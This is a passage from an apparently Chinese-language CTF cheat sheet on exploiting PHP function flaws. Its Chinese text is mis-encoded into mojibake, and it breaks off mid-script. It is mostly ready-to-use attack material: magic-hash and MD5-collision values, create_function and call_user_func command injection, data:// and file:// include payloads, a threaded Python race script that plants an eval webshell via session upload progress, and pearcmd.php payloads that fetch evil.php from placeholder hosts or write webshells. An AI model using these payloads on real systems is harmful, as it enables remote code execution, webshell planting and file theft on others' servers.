00e57640477961333848717747276704<br>ABJIHVY: 0e755264355178451322893275696586</p><p>240610708 - 0e462097431906509019562988736854<br>s878926199a - 0e545993274517709034328855841020<br>s155964671a - 0e342768416822451524974117254469<br>s214587387a - 0e848240448830537924465865611904<br>s878926199a - 0e545993274517709034328855841020<br>s1091221200a - 0e940624217856561557816327384675</p><p>aaaXXAYW: 0e540853622400160407992788832284<br>aabg7XSs: 0e087386482136013740957780965295<br>aabC9RqS: 0e041022518165728065344349536299</p><p>0e215962017 - 0e291242476940776845150308577824</p></blockquote></li><li><p>æ¯”è¾ƒç¼ºé™·åˆ©ç”¨ï¼ˆé™===å¼ºç±»å‹æƒ…å†µï¼‰</p><p>å·¥å…·ï¼šfastcoll</p><p>ä¸¤ç»„ç»è¿‡urlç¼–ç åçš„å€¼ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2</span><br><span class="line"></span><br><span class="line">b=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2</span><br></pre></td></tr></table></figure></li><li><p>æ–‡ä»¶ç¢°æ’</p><p><a target="_blank" rel="noopener" href="https://github.com/corkami/collisions/tree/master/examples/free">collisions</a></p></li><li><p>ä»¥æ•°ç»„ä¸ºå‚æ•°</p><p>md5()å‡½æ•°æ— æ³•å¤„ç†æ•°ç»„ï¼Œå¦‚æœä¼ å…¥çš„ä¸ºæ•°ç»„ï¼Œä¼šè¿”å›NULLï¼Œæ‰€ä»¥ä¸¤ä¸ªæ•°ç»„ç»è¿‡åŠ å¯†åå¾—åˆ°çš„éƒ½æ˜¯NULLï¼Œä¹Ÿå°±æ˜¯ç›¸ç­‰çš„ã€‚</p></li><li><p>NaN å’Œ INF</p><p><code>NAN</code>å’Œ<code>INF</code>ï¼Œåˆ†åˆ«ä¸ºéæ•°å­—å’Œæ— ç©·å¤§ï¼Œä½†æ˜¯var_dumpä¸€ä¸‹å®ƒä»¬çš„æ•°æ®ç±»å‹å´æ˜¯doubleï¼Œé‚£ä¹ˆåœ¨md5å‡½æ•°å¤„ç†å®ƒä»¬çš„æ—¶å€™ï¼Œæ˜¯å°†å…¶ç›´æ¥è½¬æ¢ä¸ºå­—ç¬¦ä¸²â€NANâ€å’Œå­—ç¬¦ä¸²â€INFâ€ä½¿ç”¨çš„ï¼Œä½†æ˜¯å®ƒä»¬æ‹¥æœ‰ç‰¹æ®Šçš„æ€§è´¨ï¼Œå®ƒä»¬ä¸ä»»ä½•æ•°æ®ç±»å‹ï¼ˆé™¤äº†trueï¼‰åšå¼ºç±»å‹æˆ–å¼±ç±»å‹æ¯”è¾ƒå‡ä¸ºfalseï¼Œç”šè‡³<code>NAN===NAN</code>éƒ½æ˜¯falseï¼Œä½†<code>md5(&#39;NaN&#39;)===md5(&#39;NaN&#39;)</code>ä¸ºtrueã€‚</p></li><li><p>md5(string,raw)</p><blockquote><p><strong>md5(string,raw)</strong></p><p><u>string</u> å¿…éœ€ã€‚è§„å®šè¦è®¡ç®—çš„å­—ç¬¦ä¸²ã€‚<br><u>raw</u> å¯é€‰ã€‚è§„å®šåå…­è¿›åˆ¶æˆ–äºŒè¿›åˆ¶è¾“å‡ºæ ¼å¼ï¼šTRUE - åŸå§‹ 16 å­—ç¬¦äºŒè¿›åˆ¶æ ¼å¼ï¼›FALSE - é»˜è®¤ï¼Œ32 å­—ç¬¦åå…­è¿›åˆ¶æ•°ã€‚</p></blockquote><p><code>ffifdyop</code>ï¼Œç»è¿‡md5å‡½æ•°åç»“æœä¸º <code>&#39;or&#39;6\xc9]\x99\xe9!r,\xf9\xedb\x1c</code>ï¼›</p><p><code>129581926211651571912466741651878684928</code>ï¼Œç»è¿‡md5å‡½æ•°åç»“æœä¸º <code>\x06\xdaT0D\x9f\x8fo#\xdf\xc1&#39;or&#39;8</code>ï¼›</p></li></ul><h3 id="create-function"><a href="#create-function" class="headerlink" title="create_function()"></a>create_function()</h3><ul><li><p>ä»£ç æ³¨å…¥</p><p>æºç  <code>$func(&#39;&#39;,$arg)</code> ï¼š</p><p><code>$func=&#39;create_function&#39;;</code></p><p><code>$arg=&#39;2;&#125;phpinfo();//&#39;</code> æˆ– <code>$arg=&#39;2;&#125;require(base64_decode(xxx));var_dump(get_defined_vars());//</code></p></li><li><p>è¿”å›å€¼ï¼šåŒ¿åå‡½æ•°</p><p><code>$func = create_function(&quot;&quot;,&quot;die(&#39;end.&#39;);&quot;);</code></p><p>åˆ›å»ºä¸€ä¸ª<code>$func</code>çš„åŒ¿åå‡½æ•°ï¼Œå‡½æ•°çš„ä½œç”¨æ˜¯è¾“å‡ºå­—ç¬¦ä¸²ã€‚</p><p>åŒ¿åå‡½æ•°æœ‰çœŸæ­£çš„åå­—ï¼Œä¸º<code>%00lambda_%d</code> ï¼ˆ%dæ ¼å¼åŒ–ä¸ºå½“å‰è¿›ç¨‹çš„ç¬¬nä¸ªåŒ¿åå‡½æ•°ï¼Œnçš„èŒƒå›´0-999ï¼‰</p></li></ul><h3 id="call-user-func"><a href="#call-user-func" class="headerlink" title="call_user_func()"></a>call_user_func()</h3><ul><li><p>è°ƒç”¨ç±»é™æ€æ–¹æ³•</p><p><code>call_user_func(&#39;Func::_One&#39;,&#39;one&#39;)</code></p><p><code>call_user_func([&#39;Func&#39;,&#39;_One&#39;])</code></p><p>å‚è€ƒï¼š<a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1411010">https://cloud.tencent.com/developer/article/1411010</a></p><p><code>call_user_func(Closure::fromCallable,[Closure,fromCallable])(&#39;system&#39;)(&#39;whoami&#39;)</code></p><blockquote><p>PHP 7.4</p><p>Closure::fromCallable ä½¿ç”¨å½“å‰èŒƒå›´ä»ç»™å®šçš„ callback åˆ›å»ºå¹¶è¿”å›ä¸€ä¸ªæ–°çš„åŒ¿åå‡½æ•°ã€‚æ­¤æ–¹æ³•æ£€æŸ¥ callback å‡½æ•°åœ¨ä½œç”¨åŸŸæ˜¯å¦å¯è°ƒç”¨ï¼Œ å¦‚æœä¸èƒ½ï¼Œå°±æŠ›å‡º TypeError ã€‚</p><p>æ•°ç»„ä½œä¸ºå‚æ•°äºŒæ¬¡è°ƒç”¨å‡º Closure::fromCallable ç„¶å Closure åŠ è½½åé¢ç¬¬ä¸€ä¸ªå‚æ•° system å½¢æˆå›è°ƒå‡½æ•°ç„¶ååŠ è½½ç¬¬äºŒä¸ªå‚æ•°å˜æˆ system çš„å‚æ•°ã€‚</p></blockquote></li></ul><h3 id="escapeshellarg"><a href="#escapeshellarg" class="headerlink" title="escapeshellarg()"></a>escapeshellarg()</h3><blockquote><p>escapeshellarg() å°†ç»™å­—ç¬¦ä¸²å¢åŠ ä¸€ä¸ªå•å¼•å·å¹¶ä¸”èƒ½å¼•ç”¨æˆ–è€…è½¬ç ä»»ä½•å·²ç»å­˜åœ¨çš„å•å¼•å·ï¼Œè¿™æ ·ä»¥ç¡®ä¿èƒ½å¤Ÿç›´æ¥å°†ä¸€ä¸ªå­—ç¬¦ä¸²ä¼ å…¥ shell å‡½æ•°ï¼Œå¹¶ä¸”è¿˜æ˜¯ç¡®ä¿å®‰å…¨çš„ã€‚å¯¹äºç”¨æˆ·è¾“å…¥çš„éƒ¨åˆ†å‚æ•°å°±åº”è¯¥ä½¿ç”¨è¿™ä¸ªå‡½æ•°ã€‚shell å‡½æ•°åŒ…å« exec(), system() æ‰§è¡Œè¿ç®—ç¬¦ã€‚</p></blockquote><ul><li>ä¸å¯è§å­—ç¬¦æ’å…¥ï¼ˆ%80-%ffï¼‰</li></ul><h3 id="escapeshellcmd"><a href="#escapeshellcmd" class="headerlink" title="escapeshellcmd()"></a>escapeshellcmd()</h3><blockquote><p>escapeshellcmd() å¯¹å­—ç¬¦ä¸²ä¸­å¯èƒ½ä¼šæ¬ºéª— shell å‘½ä»¤æ‰§è¡Œä»»æ„å‘½ä»¤çš„å­—ç¬¦è¿›è¡Œè½¬ä¹‰ã€‚ æ­¤å‡½æ•°ä¿è¯ç”¨æˆ·è¾“å…¥çš„æ•°æ®åœ¨ä¼ é€åˆ° exec() æˆ– system() å‡½æ•°ï¼Œæˆ–è€… æ‰§è¡Œæ“ä½œç¬¦ ä¹‹å‰è¿›è¡Œè½¬ä¹‰ï¼›åæ–œçº¿ï¼ˆ<code>\</code>ï¼‰ä¼šåœ¨ä»¥ä¸‹å­—ç¬¦ä¹‹å‰æ’å…¥ï¼š <code>&amp;#;`|*?~&lt;&gt;^()[]&#123;&#125;$, \x0A, \xFF</code>ï¼›<code>&#39;</code> å’Œ <code>&quot;</code> ä»…åœ¨ä¸é…å¯¹å„¿çš„æ—¶å€™è¢«è½¬ä¹‰ï¼›åœ¨ Windows å¹³å°ä¸Šï¼Œæ‰€æœ‰è¿™äº›å­—ç¬¦ä»¥åŠ <code>%</code> å’Œ <code>!</code> å­—ç¬¦éƒ½ä¼šè¢«ç©ºæ ¼ä»£æ›¿ã€‚</p></blockquote><ul><li><p>escapeshellarg()+escapeshellcmd() é…å¯¹ï¼š</p><p>å¤šä¸ªå‚æ•°æ³¨å…¥ï¼š<a target="_blank" rel="noopener" href="https://paper.seebug.org/164/">PHP escapeshellarg()+escapeshellcmd() ä¹‹æ®‡</a></p></li></ul><h3 id="ereg-eregi"><a href="#ereg-eregi" class="headerlink" title="ereg() / eregi()"></a>ereg() / eregi()</h3><ul><li><p>NULLæˆªæ–­æ¼æ´</p><p>ereg()å‡½æ•°å­˜åœ¨NULLæˆªæ–­æ¼æ´,å¯ä»¥%00æˆªæ–­ï¼Œé‡åˆ°%00åˆ™é»˜è®¤ä¸ºå­—ç¬¦ä¸²çš„ç»“æŸï¼Œæ‰€ä»¥å¯ä»¥ç»•è¿‡ä¸€äº›æ­£åˆ™è¡¨è¾¾å¼çš„æ£€æŸ¥ã€‚</p><p>ereg()åªèƒ½å¤„ç†å­—ç¬¦ä¸²çš„ï¼Œé‡åˆ°æ•°ç»„åšå‚æ•°è¿”å›NULLã€‚</p></li></ul><h3 id="strpos"><a href="#strpos" class="headerlink" title="strpos()"></a>strpos()</h3><ul><li><p>ä»¥æ•°ç»„ä¸ºå‚æ•°</p><p>strpos()å‡½æ•°å¦‚æœä¼ å…¥æ•°ç»„ï¼Œä¾¿ä¼šè¿”å›NULLã€‚</p></li><li><p>äºŒæ¬¡ç¼–ç ç»•å…³é”®å­—</p><p>å‚è€ƒï¼š<a target="_blank" rel="noopener" href="https://bugs.php.net/bug.php?id=76671">https://bugs.php.net/bug.php?id=76671</a></p></li></ul><h3 id="strcmp"><a href="#strcmp" class="headerlink" title="strcmp()"></a>strcmp()</h3><ul><li><p>å‡½æ•°ç¼ºé™·</p><blockquote><p><code>strcmp()</code>å‡½æ•°æ¯”è¾ƒä¸¤ä¸ªå­—ç¬¦ä¸²(åŒºåˆ†å¤§å°å†™ï¼‰ï¼Œå®šä¹‰ä¸­æ˜¯æ¯”è¾ƒ<strong>å­—ç¬¦ä¸²ç±»å‹</strong>çš„ï¼Œä½†å¦‚æœè¾“å…¥å…¶ä»–ç±»å‹è¿™ä¸ªå‡½æ•°å°†å‘ç”Ÿé”™è¯¯ï¼Œåœ¨å®˜æ–¹æ–‡æ¡£çš„è¯´æ˜ä¸­è¯´åˆ°åœ¨<code>php 5.2</code>ç‰ˆæœ¬ä¹‹å‰ï¼Œåˆ©ç”¨<code>strcmp</code>å‡½æ•°å°†æ•°ç»„ä¸å­—ç¬¦ä¸²è¿›è¡Œæ¯”è¾ƒä¼šè¿”å›<code>-1</code>ï¼Œä½†æ˜¯ä»<code>5.3</code>å¼€å§‹ï¼Œä¼šè¿”å›<code>0</code>ã€‚</p></blockquote></li></ul><h3 id="add-slashes"><a href="#add-slashes" class="headerlink" title="add_slashes()"></a>add_slashes()</h3><ul><li><code>$&#123;phpinfo()&#125;</code></li></ul><h3 id="preg-replace"><a href="#preg-replace" class="headerlink" title="preg_replace()"></a>preg_replace()</h3><ul><li><p>ä»£ç æ‰§è¡Œï¼ˆé™/eæ¨¡å¼ï¼‰</p><blockquote><p><code>preg_replace</code>(PHP 5.5)<br>åŠŸèƒ½ ï¼š å‡½æ•°æ‰§è¡Œä¸€ä¸ªæ­£åˆ™è¡¨è¾¾å¼çš„æœç´¢å’Œæ›¿æ¢<br>å®šä¹‰ ï¼š <code>mixed preg_replace ( mixed $pattern , mixed $replacement , mixed $subject )</code><br>æœç´¢ subject ä¸­åŒ¹é… pattern çš„éƒ¨åˆ†ï¼Œ å¦‚æœåŒ¹é…æˆåŠŸä»¥ replacement è¿›è¡Œæ›¿æ¢<br><code>$pattern</code> å­˜åœ¨ /e æ¨¡å¼ä¿®æ­£ç¬¦ï¼Œå…è®¸ä»£ç æ‰§è¡Œ<br>/e æ¨¡å¼ä¿®æ­£ç¬¦ï¼Œæ˜¯ preg_replace() å°† <code>$replacement</code> å½“åšphpä»£ç æ¥æ‰§è¡Œ</p></blockquote></li></ul><h3 id="filter-var"><a href="#filter-var" class="headerlink" title="filter_var()"></a>filter_var()</h3><ul><li><p><strong>FILTER_VALIDATE_EMAIL</strong></p><p>å½¢å¼ï¼š<code>local-part@domain-part</code></p><ol><li>é‚®ç®±local-partéƒ¨åˆ†å¯ä»¥ç”¨åŒå¼•å·åŒ…è£¹ï¼ŒåŒå¼•å·å†…å³å¯å¡«å…¥ä»»æ„å­—ç¬¦ï¼Œå¦‚<code>&quot;Joe&#39;Blow&quot;@example.com</code></li></ol></li><li><p><strong>FILTER_VALIDATE_URL</strong></p><ol><li><code>0://www.baidu.com;</code></li></ol></li></ul><h3 id="is-file-file-exists"><a href="#is-file-file-exists" class="headerlink" title="is_file() / file_exists()"></a>is_file() / file_exists()</h3><ul><li><p>è¶…è¿‡20æ¬¡è½¯é“¾æ¥åå¯ä»¥ç»•è¿‡ï¼š</p><p><code>?file=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php</code></p></li></ul><h3 id="require-once"><a href="#require-once" class="headerlink" title="require_once()"></a>require_once()</h3><ul><li><p>åŒ…å«çš„è½¯è¿æ¥å±‚æ•°è¾ƒå¤šæ—¶ï¼ŒhashåŒ¹é…ä¼šç›´æ¥å¤±æ•ˆé€ æˆé‡å¤åŒ…å«ï¼ŒåŒ <code>is_file()</code></p><p>å‚è€ƒï¼š<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/213235">phpæºç åˆ†æ require_once ç»•è¿‡ä¸èƒ½é‡å¤åŒ…å«æ–‡ä»¶çš„é™åˆ¶</a></p></li></ul><h3 id="include"><a href="#include" class="headerlink" title="include()"></a>include()</h3><ul><li><p>æ—¥å¿—åŒ…å«</p><p>URLï¼š<code>?x=/var/log/nginx/access.log</code></p><p>ä¿®æ”¹<code>User-Agent</code>ä¸º<code>&lt;?php highlight_file(&#39;xxx.php&#39;); ?&gt;</code></p></li><li><p>æœ‰åç¼€ç»•è¿‡</p><p><code>?c=data:text/plain,&lt;?php system(&#39;ls&#39;)?&gt;</code></p><p><code>?c=data:text/plain;base64,PD9waHAgcGhwaW5mbygpPz4</code></p><p><code>?c=data:,&lt;?php system(&#39;ls&#39;)?&gt;</code></p></li><li><p>fileåè®®åŒ…å«</p><p><code>file:///etc/passwd</code></p><p><code>file://localhost/etc/passwd</code></p></li><li><p>zip/pharåè®®åŒ…å«ï¼ˆæœ‰ç‰¹å®šåç¼€ï¼‰</p><p>è¿™ä¸ªæ–¹æ³•é€‚ç”¨äºéªŒè¯åŒ…å«æ–‡ä»¶ä¸ºç‰¹å®šåç¼€æ—¶ã€‚</p><ul><li><p><strong>zip</strong></p><p>é¦–å…ˆæ–°å»ºä¸€ä¸ªzipæ–‡ä»¶ï¼Œé‡Œé¢å‹ç¼©ç€ä¸€ä¸ªphpè„šæœ¬ã€‚</p><p>ç„¶åæ„é€ <code>zip://php.zip#php.jpg</code>ï¼š</p><p><code>http://127.0.0.1/file.php?file=zip://php.zip%23php.jpg</code></p></li><li><p><strong>phar</strong> (PHPç‰ˆæœ¬&gt;5.3.0)</p><p>é¦–å…ˆè¦ç”¨pharç±»æ‰“åŒ…ä¸€ä¸ªpharæ ‡å‡†åŒ…ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$p</span> = <span class="keyword">new</span> <span class="title class_">PharData</span>(<span class="title function_ invoke__">dirname</span>(<span class="keyword">__FILE__</span>).<span class="string">&#x27;./test.zip&#x27;</span>, <span class="number">0</span>,<span class="string">&#x27;test&#x27;</span>,<span class="title class_">Phar</span>::<span class="variable constant_">ZIP</span>);</span><br><span class="line"><span class="variable">$p</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&#x27;test.txt&#x27;</span>, <span class="string">&#x27;&lt;?php phpinfo();?&gt;&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li></ul></li></ul><p>ä¼šç”Ÿæˆä¸€ä¸ªzipçš„å‹ç¼©æ–‡ä»¶ã€‚ç„¶åæ„é€ </p><p><code>http://127.0.0.1/file.php?file=phar://php.zip/php.jpg</code></p><ul><li><p>åˆ©ç”¨<strong>session.upload_progress</strong></p><p>å¯ä»¥åˆ©ç”¨<code>session.upload_progress</code>å°†æ¶æ„è¯­å¥å†™å…¥sessionæ–‡ä»¶ï¼Œä»è€ŒåŒ…å«sessionæ–‡ä»¶ã€‚å‰æéœ€è¦çŸ¥é“sessionæ–‡ä»¶çš„å­˜æ”¾ä½ç½®ã€‚</p><p>å¦‚æœ<code>session.auto_start=On</code> ï¼Œåˆ™PHPåœ¨æ¥æ”¶è¯·æ±‚çš„æ—¶å€™ä¼šè‡ªåŠ¨åˆå§‹åŒ–Sessionï¼Œä¸å†éœ€è¦æ‰§è¡Œsession_start()ã€‚ä½†é»˜è®¤æƒ…å†µä¸‹ï¼Œè¿™ä¸ªé€‰é¡¹éƒ½æ˜¯å…³é—­çš„ã€‚</p><p>sessionæœ‰ä¸€ä¸ªé»˜è®¤é€‰é¡¹ï¼Œ<code>session.use_strict_mode</code>é»˜è®¤å€¼ä¸º<code>0</code>ã€‚æ­¤æ—¶ç”¨æˆ·æ˜¯å¯ä»¥è‡ªå·±å®šä¹‰Session IDçš„ã€‚æ¯”å¦‚ï¼Œæˆ‘ä»¬åœ¨Cookieé‡Œè®¾ç½®<code>PHPSESSID=TGAO</code>ï¼ŒPHPå°†ä¼šåœ¨æœåŠ¡å™¨ä¸Šåˆ›å»ºä¸€ä¸ªæ–‡ä»¶ï¼š<code>/tmp/sess_TGAO</code>ã€‚å³ä½¿æ­¤æ—¶ç”¨æˆ·æ²¡æœ‰åˆå§‹åŒ–Sessionï¼ŒPHPä¹Ÿä¼šè‡ªåŠ¨åˆå§‹åŒ–Sessionã€‚ å¹¶äº§ç”Ÿä¸€ä¸ªé”®å€¼ï¼Œè¿™ä¸ªé”®å€¼ç”±<code>ini.get(&quot;session.upload_progress.prefix&quot;)+ç”±æˆ‘ä»¬æ„é€ çš„session.upload_progress.nameå€¼</code>ç»„æˆï¼Œæœ€åè¢«å†™å…¥sess_æ–‡ä»¶é‡Œã€‚</p><p>é»˜è®¤é…ç½®<code>session.upload_progress.cleanup = on</code>å¯¼è‡´æ–‡ä»¶ä¸Šä¼ åï¼Œsessionæ–‡ä»¶å†…å®¹ç«‹å³æ¸…ç©ºï¼Œæ­¤æ—¶æˆ‘ä»¬å¯ä»¥åˆ©ç”¨ç«äº‰ï¼Œåœ¨sessionæ–‡ä»¶å†…å®¹æ¸…ç©ºå‰è¿›è¡ŒåŒ…å«åˆ©ç”¨ã€‚</p><p>å‚è€ƒï¼š<a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/202819.html">https://www.freebuf.com/vuls/202819.html</a></p><p><strong>å¸¸è§PHP-Sessionå­˜æ”¾ä½ç½®</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/var/lib/php5/sess_PHPSESSID</span><br><span class="line">/var/lib/php7/sess_PHPSESSID</span><br><span class="line">/var/lib/php/sess_PHPSESSID</span><br><span class="line">/tmp/sess_PHPSESSID</span><br><span class="line">/tmp/sessions/sess_PHPSESSED</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line">sessid = <span class="string">&#x27;Q&#x27;</span></span><br><span class="line">data = &#123;<span class="string">&quot;cmd&quot;</span>:<span class="string">&quot;system(&#x27;cat fl0g.php&#x27;);&quot;</span>&#125;</span><br><span class="line">url = <span class="string">&#x27;http://6bad481c-1da6-4a89-92f6-db28a56e4f28.chall.ctf.show/index.php&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>(<span class="params">session</span>):</span><br><span class="line">	<span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">		f = io.BytesIO(<span class="string">b&#x27;a&#x27;</span> * <span class="number">1024</span> * <span class="number">50</span>)</span><br><span class="line">		resp = session.post(url, data=&#123;<span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="string">&#x27;&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;&#x27;</span>&#125;, files=&#123;<span class="string">&#x27;file&#x27;</span>: (<span class="string">&#x27;q.txt&#x27;</span>,f)&#125;, cookies=&#123;<span class="string">&#x27;PHPSESSID&#x27;</span>: sessid&#125; )</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>(<span class="params">session</span>):</span><br><span class="line">	<span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">		resp = session.post(url+<span class="string">&#x27;?file=/tmp/sess_&#x27;</span>+sessid,data=data)</span><br><span class="line">		<span class="keyword">if</span> <span class="string">&#x27;q.txt&#x27;</span> <span class="keyword">in</span> resp.text:</span><br><span class="line">			<span class="built_in">print</span>(resp.text)</span><br><span class="line">			event.clear()</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			<span class="comment">#print(&quot;[+++++++++++++]retry&quot;)</span></span><br><span class="line">			<span class="keyword">pass</span></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">	event=threading.Event()</span><br><span class="line">	<span class="keyword">with</span> requests.session() <span class="keyword">as</span> session:</span><br><span class="line">		<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">30</span>): </span><br><span class="line">			threading.Thread(target=write,args=(session,)).start()</span><br><span class="line">		<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">30</span>):</span><br><span class="line">			threading.Thread(target=read,args=(session,)).start()</span><br><span class="line">	event.<span class="built_in">set</span>()</span><br></pre></td></tr></table></figure></li><li><p>åˆ©ç”¨<strong>PEAR</strong> ï¼ˆå¼€å¯register_argc_argvï¼‰</p><p>å¯èƒ½è·¯å¾„ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/usr/local/lib/php/pearcmd.php</span><br><span class="line">/usr/share/pear/pearcmd.php</span><br></pre></td></tr></table></figure><p>PEARæ˜¯å¯é‡ç”¨çš„PHPç»„ä»¶æ¡†æ¶å’Œç³»ç»Ÿåˆ†å‘ï¼Œä¼šéšPHPå®‰è£…æ—¶è‡ªåŠ¨å®‰è£…ã€‚</p><p><code>?file=/usr/local/lib/php/pearcmd.php&amp;+download+http://vps/eval.php</code>ï¼ˆç›´æ¥ä¸‹è½½åˆ°webç›®å½•ï¼‰</p><p><code>?file=/usr/local/lib/php/pearcmd.php&amp;+install+-R+/tmp+http://ip/evil.php</code> ï¼ˆè·¯å¾„ï¼š<code>/tmp/pear/download/evil.php</code>ï¼‰</p><p><code>?file=/usr/local/lib/php/pearcmd.php&amp;+config-create+/&lt;?=@eval($_POST[0]);?&gt;+/tmp/test.php</code>ï¼ˆè·¯å¾„ï¼š<code>/tmp/test.php</code>ï¼‰</p><p><code>?file=/usr/local/lib/php/pearcmd.php&amp;+-c+/tmp/eval.php+-d+man_dir=&lt;?eval($_POST[0]);?&gt;+-s+ HTTP/1.1</code>ï¼ˆBurpsuiteé˜²æµè§ˆå™¨è½¬ç ï¼‰</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Disposition: attachment; filename=&quot;shell.php&quot;&#x27;</span>);</span><br><span class="line"> <span class="keyword">echo</span> <span class="string">&lt;&lt;&lt;EOF</span></span><br><span class="line"><span class="string">&lt;?php</span></span><br><span class="line"><span class="string">system(\$_GET[0]);</span></span><br><span class="line"><span class="string">?&gt;</span></span><br><span class="line"><span class="string">EOF</span>;</span><br></pre></td></tr></table></figure><p><code>?file=/tmp/pear/download/shell.php&amp;0=/readflag</code></p><p><strong>ç¦ç”¨pearcmd</strong>ï¼špeclcmd.php</p></li><li><p><strong>PHPFilterChain RCE</strong></p><p>å‚è€ƒï¼š</p><p><a target="_blank" rel="noopener" href="https://k1te.cn/2022/01/10/LFIå­¦ä¹ /">LFI æ–°å§¿åŠ¿å­¦ä¹ </a></p><p><a target="_blank" rel="noopener" href="https://tttang.com/archive/1395/">hxp CTF 2021 - The End Of LFI?</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;&quot;</span></span><br><span class="line">file_to_use = <span class="string">&quot;/var/hint&quot;</span></span><br><span class="line">command = <span class="string">&quot;id&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#&lt;?=`$_GET[0]`;;?&gt;</span></span><br><span class="line">base64_payload = <span class="string">&quot;PD89YCRfR0VUWzBdYDs7Pz4&quot;</span></span><br><span class="line"></span><br><span class="line">conversions = &#123;</span><br><span class="line">    <span class="string">&#x27;R&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.MAC.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;B&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.CP1256.UCS2&#x27;</span>,</span><br><span class="line">    <span 